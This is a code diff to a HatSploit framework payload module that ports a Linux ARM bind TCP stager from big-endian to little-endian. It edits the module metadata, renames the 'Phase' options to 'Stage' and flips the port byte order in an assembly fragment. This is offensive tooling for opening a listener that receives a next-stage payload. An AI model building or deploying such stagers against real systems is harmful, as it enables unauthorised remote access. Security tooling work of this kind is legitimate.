@@ -9,23 +9,23 @@ from hatsploit.lib.core.payload.basic import *
 class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__({
-            'Name': "Linux armbe Bind TCP",
-            'Payload': "linux/armbe/bind_tcp",
+            'Name': "Linux armle Bind TCP",
+            'Payload': "linux/armle/bind_tcp",
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
             'Description': (
                 "This payload creates an interactive bind TCP connection for Linux "
-                "with ARM big-endian architecture and reads next phase."
+                "with ARM little-endian architecture and reads next stage."
             ),
-            'Arch': ARCH_ARMBE,
+            'Arch': ARCH_ARMLE,
             'Platform': OS_LINUX,
             'Type': BIND_TCP,
         })
 
-        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
+        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                       False, advanced=True)
-        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
+        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                     False, advanced=True)
 
     def run(self):
@@ -186,8 +186,8 @@ class HatSploitPayload(Payload, Handler):
         assembly += f"""
         addr:
             .short 0x2
-            .short 0x{self.rport.big.hex()}
+            .short 0x{self.rport.little.hex()}
             .word 0x0
         """
 
-        return self.assemble(assembly)
+        return self.__asm__(assembly)
